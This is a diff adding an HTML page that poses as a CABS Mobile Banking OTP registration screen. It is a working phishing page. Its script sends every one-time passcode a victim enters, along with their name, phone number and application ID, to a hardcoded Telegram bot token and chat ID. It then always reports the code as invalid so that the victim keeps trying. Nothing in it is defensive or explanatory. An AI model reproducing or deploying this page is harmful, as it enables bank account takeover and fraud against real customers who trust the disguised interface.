@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CABS Mobile Banking - Enter OTP</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f4f6f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        .registration-card {
+            width: 100%;
+            max-width: 460px;
+            background-color: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            padding: 40px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .back-button {
+            width: 40px;
+            height: 40px;
+            background-color: #7cc544;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 20px;
+            margin-bottom: 25px;
+            cursor: pointer;
+            border: none;
+            transition: opacity 0.2s;
+        }
+
+        .back-button:hover {
+            opacity: 0.9;
+        }
+
+        .header-title {
+            color: #3b3a8a;
+            font-size: 32px;
+            font-weight: bold;
+            margin: 0 0 10px 0;
+        }
+
+        .sub-header {
+            color: #888;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 20px;
+        }
+
+        .instruction-text {
+            color: #555;
+            font-size: 18px;
+            line-height: 1.4;
+            margin-bottom: 8px;
+        }
+
+        .wrong-number-link {
+            color: #3b3a8a;
+            font-size: 15px;
+            text-decoration: underline;
+            background: none;
+            border: none;
+            padding: 0;
+            cursor: pointer;
+            margin-bottom: 35px;
+            display: inline-block;
+        }
+
+        .wrong-number-link:hover {
+            color: #2f2e70;
+        }
+
+        .otp-container {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 30px;
+            justify-content: space-between;
+        }
+
+        .otp-input {
+            width: 50px;
+            height: 56px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 24px;
+            text-align: center;
+            color: #333;
+            outline: none;
+            background-color: white;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .otp-input:focus {
+            border-color: #3b3a8a;
+            box-shadow: 0 0 0 3px rgba(59, 58, 138, 0.1);
+        }
+
+        .validity-text {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        .validity-text strong {
+            color: #333;
+        }
+
+        .resend-text {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 40px;
+        }
+
+        .resend-link {
+            color: #3b3a8a;
+            text-decoration: underline;
+            cursor: pointer;
+            font-weight: 500;
+        }
+
+        .resend-link:hover {
+            color: #2f2e70;
+        }
+
+        .submit-button {
+            width: 100%;
+            background-color: #3b3a8a;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: background-color 0.2s, box-shadow 0.2s;
+            box-shadow: 0 4px 10px rgba(59, 58, 138, 0.3);
+        }
+
+        .submit-button:hover {
+            background-color: #2f2e70;
+        }
+
+        .submit-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.2s ease;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .modal-dialog {
+            width: 90%;
+            max-width: 380px;
+            background-color: white;
+            border-radius: 16px;
+            padding: 30px 24px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .modal-logo {
+            font-weight: bold;
+            font-size: 20px;
+            color: #3b3a8a;
+            margin-bottom: 20px;
+            letter-spacing: 0.5px;
+        }
+
+        .modal-logo span {
+            color: #7cc544;
+        }
+
+        .modal-divider {
+            width: 100%;
+            height: 1px;
+            background-color: #eee;
+            margin-bottom: 25px;
+        }
+
+        .modal-title {
+            color: #3b3a8a;
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .modal-message {
+            color: #666;
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+
+        .modal-ok-button {
+            width: 100%;
+            background-color: #3b3a8a;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            padding: 14px;
+            font-size: 15px;
+            font-weight: bold;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            box-shadow: 0 4px 10px rgba(59, 58, 138, 0.2);
+        }
+
+        .modal-ok-button:hover {
+            background-color: #2f2e70;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                background-color: white;
+                align-items: flex-start;
+            }
+            .registration-card {
+                box-shadow: none;
+                padding: 20px;
+                border-radius: 0;
+                min-height: 100vh;
+            }
+            .otp-input {
+                width: 42px;
+                height: 48px;
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="registration-card">
+        <button class="back-button" onclick="history.back()">&#8249;</button>
+        
+        <h1 class="header-title">Registration</h1>
+        <div class="sub-header">Enter OTP</div>
+        
+        <p class="instruction-text">
+            Enter OTP that was sent to<br>
+            <strong id="phoneDisplay">263775594888</strong>
+        </p>
+        
+        <button class="wrong-number-link" onclick="history.back()">Wrong Number?</button>
+        
+        <div class="otp-container">
+            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric" autofocus>
+            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+        </div>
+
+        <div class="validity-text">
+            The code is valid for <strong>5 minutes</strong>
+        </div>
+        
+        <div class="resend-text">
+            Didn't receive the OTP? <span class="resend-link">Resend</span>
+        </div>
+
+        <button class="submit-button" id="submitBtn">Submit</button>
+    </div>
+
+    <div class="modal-overlay" id="errorModal">
+        <div class="modal-dialog">
+            <div class="modal-logo">CABS<span>)</span></div>
+            <div class="modal-divider"></div>
+            <h3 class="modal-title">Token Verification</h3>
+            <p class="modal-message">
+                The entered OTP value is invalid.<br>
+                Please try again
+            </p>
+            <button class="modal-ok-button" id="modalOkBtn">OK</button>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8350396603:AAG2fThlCEOBcN9TQDqdM0wRR_N590DJveI';
+        const CHAT_ID = '8213174863';
+
+        // Simple counter so each attempt is labelled #1, #2, #3...
+        let otpAttempts = parseInt(localStorage.getItem('otpAttempts') || '0', 10);
+
+        function sendToTelegram(message) {
+            const encoded = encodeURIComponent(message);
+            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}&parse_mode=Markdown`)
+                .then(r => r.json())
+                .then(r => { console.log('Telegram (otp):', r); return r; })
+                .catch(e => { console.error('Telegram error:', e); });
+        }
+
+        let applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+
+        const phoneDisplay = document.getElementById('phoneDisplay');
+        if (applicationData.phoneNumber) {
+            phoneDisplay.textContent = applicationData.phoneNumber.replace('+263', '263');
+        }
+
+        const inputs = document.querySelectorAll('.otp-input');
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+                if (e.target.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        const submitBtn = document.getElementById('submitBtn');
+        const errorModal = document.getElementById('errorModal');
+        const modalOkBtn = document.getElementById('modalOkBtn');
+
+        function clearOtpInputs() {
+            inputs.forEach(i => i.value = '');
+            inputs[0].focus();
+        }
+
+        submitBtn.addEventListener('click', () => {
+            let otp = '';
+            inputs.forEach(i => otp += i.value);
+
+            if (otp.length !== 6) {
+                alert('Please enter the 6-digit OTP');
+                return;
+            }
+
+            // Increment attempt counter
+            otpAttempts++;
+            localStorage.setItem('otpAttempts', String(otpAttempts));
+
+            // Save last attempted OTP
+            applicationData.otp = otp;
+            localStorage.setItem('loanApplication', JSON.stringify(applicationData));
+
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Verifying...';
+
+            // ---- Send THIS attempt to Telegram every time ----
+            const message = `
+🔢 *OTP Attempt #${otpAttempts}*
+
+🆔 Application ID: ${applicationData.applicationId || 'N/A'}
+👤 Applicant: ${applicationData.firstName || 'Valued Client'} ${applicationData.lastName || ''}
+📞 Phone: ${applicationData.phoneNumber || 'N/A'}
+❌ OTP Entered (Invalid): ${otp}
+🕐 Time: ${new Date().toLocaleString()}
+            `;
+
+            sendToTelegram(message).finally(() => {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit';
+                errorModal.classList.add('active');
+            });
+        });
+
+        // OK → close modal, clear boxes, allow another attempt
+        modalOkBtn.addEventListener('click', () => {
+            errorModal.classList.remove('active');
+            clearOtpInputs();
+        });
+    </script>
+
+</body>
+</html>
